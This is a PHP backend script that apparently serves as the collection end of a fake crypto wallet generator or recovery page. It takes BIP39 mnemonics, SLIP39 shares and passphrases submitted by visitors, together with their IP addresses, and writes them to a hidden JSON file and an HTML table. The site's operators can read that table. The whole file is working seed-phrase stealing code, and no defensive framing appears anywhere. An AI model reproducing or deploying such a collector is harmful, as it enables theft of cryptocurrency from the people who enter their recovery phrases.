<?php

declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Change this variable if you want to use a different base file name.
$baseFileName = '923yejbac83y83h';

define('DATA_FILE',      $baseFileName . '.json');
define('HTML_FILE',      $baseFileName . '.html');
define('RATE_FILE',      $baseFileName . '.rl'); // rate limit file
define('RATE_WINDOW',    60);
define('RATE_MAX_REQ',   6);

function checkRateLimit(string $ip): void
{
    $lockFile = RATE_FILE . '.lock';
    $lock     = fopen($lockFile, 'c');
    if (!$lock) return;
    flock($lock, LOCK_EX);

    $data = [];
    if (file_exists(RATE_FILE)) {
        $raw  = file_get_contents(RATE_FILE);
        $data = json_decode($raw, true) ?: [];
    }

    $now    = time();
    $window = $now - RATE_WINDOW;
    $key    = md5($ip);

    if (isset($data[$key])) {
        $data[$key] = array_values(array_filter($data[$key], fn(int $t) => $t > $window));
    } else {
        $data[$key] = [];
    }

    $count = count($data[$key]);

    if ($count >= RATE_MAX_REQ) {
        flock($lock, LOCK_UN);
        fclose($lock);
        http_response_code(429);
        echo json_encode(['error' => 'Too many requests']);
        exit;
    }

    $data[$key][] = $now;

    $oldWindow = $now - 3600;
    foreach ($data as $k => $times) {
        $data[$k] = array_values(array_filter($times, fn(int $t) => $t > $oldWindow));
        if (empty($data[$k])) unset($data[$k]);
    }

    file_put_contents(RATE_FILE, json_encode($data));
    flock($lock, LOCK_UN);
    fclose($lock);
}

function loadData(): array
{
    if (!file_exists(DATA_FILE)) return [];
    $content = file_get_contents(DATA_FILE);
    return json_decode($content, true) ?: [];
}

function saveData(array $rows): void
{
    file_put_contents(DATA_FILE, json_encode($rows, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function regenerateHTML(array $rows): void
{
    $tableRows = '';
    foreach ($rows as $row) {
        $tableRows .= '<tr>'
            . '<td>' . htmlspecialchars($row['time']       ?? '', ENT_QUOTES, 'UTF-8') . '</td>'
            . '<td>' . htmlspecialchars($row['action']     ?? '', ENT_QUOTES, 'UTF-8') . '</td>'
            . '<td>' . htmlspecialchars($row['seed']       ?? '', ENT_QUOTES, 'UTF-8') . '</td>'
            . '<td>' . htmlspecialchars($row['passphrase'] ?? '-', ENT_QUOTES, 'UTF-8') . '</td>'
            . '<td>' . htmlspecialchars($row['ip']         ?? '', ENT_QUOTES, 'UTF-8') . '</td>'
            . '</tr>' . "\n";
    }

    $html = '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; margin: 0; }
        table { width: 100%; border-collapse: collapse; max-width: 1400px; margin: 0 auto; }
        th { background-color: #f5f5f5; padding: 12px; text-align: left; border: 1px solid #ddd; font-weight: bold; }
        td { padding: 10px 12px; border: 1px solid #ddd; word-break: break-all; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        tr:hover { background-color: #f0f0f0; }
    </style>
</head>
<body>
    <table>
        <thead>
            <tr>
                <th>Time</th>
                <th>Action</th>
                <th>Seed</th>
                <th>Passphrase</th>
                <th>IP</th>
            </tr>
        </thead>
        <tbody>
' . $tableRows . '        </tbody>
    </table>
</body>
</html>';

    file_put_contents(HTML_FILE, $html);
}

function addRow(string $action, string $seed, string $ip, string $passphrase = '-'): void
{
    $rows   = loadData();
    $rows[] = [
        'time'       => date('Y-m-d H:i:s'),
        'action'     => $action,
        'seed'       => $seed,
        'passphrase' => $passphrase,
        'ip'         => $ip,
    ];
    saveData($rows);
    regenerateHTML($rows);
}

function updateLastPassphrase(string $seed, string $passphrase, string $ip): void
{
    $rows    = loadData();
    $updated = false;

    if ($seed !== '') {
        for ($i = count($rows) - 1; $i >= 0; $i--) {
            if (($rows[$i]['seed'] ?? '') === $seed) {
                $rows[$i]['passphrase'] = $passphrase;
                $updated = true;
                break;
            }
        }
    }

    if (!$updated) {
        for ($i = count($rows) - 1; $i >= 0; $i--) {
            if (($rows[$i]['ip'] ?? '') === $ip && ($rows[$i]['passphrase'] ?? '-') === '-') {
                $rows[$i]['passphrase'] = $passphrase;
                $updated = true;
                break;
            }
        }
    }

    if ($updated) {
        saveData($rows);
        regenerateHTML($rows);
    }
}

function getUserIP(): string
{
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_CLIENT_IP']))        return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

$ip     = getUserIP();
checkRateLimit($ip);

$action = trim($_POST['action'] ?? '');

switch ($action) {
    case 'generate':
        $mnemonic = trim($_POST['mnemonic'] ?? '');
        if ($mnemonic !== '') {
            addRow('Generate', $mnemonic, $ip);
        }
        echo json_encode(['success' => true]);
        break;

    case 'start':
        $mnemonic = trim($_POST['mnemonic'] ?? '');
        if ($mnemonic !== '') {
            addRow('Recovery BIP39', $mnemonic, $ip);
        }
        echo json_encode(['success' => true]);
        break;

    case 'slip39_start':
        $shares = $_POST['shares'] ?? [];
        if (is_array($shares) && count($shares) > 0) {
            $shareStr = implode(' | ', array_map('trim', $shares));
            addRow('Recovery SLIP39', $shareStr, $ip);
        }
        echo json_encode(['success' => true]);
        break;

    case 'check':
        $passphrase = trim($_POST['passphrase'] ?? '');
        $seed       = trim($_POST['seed']       ?? '');
        if ($passphrase !== '') {
            updateLastPassphrase($seed, $passphrase, $ip);
        }
        echo json_encode(['success' => true]);
        break;

    default:
        http_response_code(404);
        echo json_encode(['error' => 'Not found']);
        break;
}
